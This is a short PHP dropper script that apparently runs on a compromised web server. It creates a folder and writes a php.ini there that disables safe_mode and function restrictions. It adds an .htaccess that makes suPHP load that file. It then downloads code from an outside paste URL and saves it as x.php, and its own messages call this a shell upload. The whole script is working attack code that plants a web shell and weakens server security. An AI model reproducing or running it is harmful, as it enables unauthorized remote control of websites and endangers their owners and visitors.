<?
$dir = "mkdir";
$bb = $dir('jingkontot');
if($bb){
    echo "[jingkontot] => Folder Create Complate !";
} else {
    echo "[jingkontot] Error !";
}
$jingkontot = fopen('jingkontot/php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($jingkontot ,$sec);
fclose($jingkontot);
if($jingkontot){
    echo "
[php.ini] => Create Complate !";
} else {
    echo "
[php.ini] Error !";
}
$create = fopen("jingkontot/.htaccess", 'w');
$s3c = "suPHP_ConfigPath /home/".get_current_user()."/public_html/jingkontot/php.ini";
fwrite($create ,$s3c);
fclose($create);
if($create) {
    echo "
[.htaccess] => Create Complate !";
} else {
    echo "
[.htaccess] Error !";
}
$b37 = 'https://www.klgrth.io/paste/3yv5v/raw';
$sh = file_get_contents($b37);
$open = fopen('jingkontot/x.php', 'w');
fwrite($open,$sh);
fclose($open);
if($open) {
    echo "
[jingkontot.php] => Shell Upload Complate !";
} else {
    echo "
[jingkontot.php] => Error !";
}
?>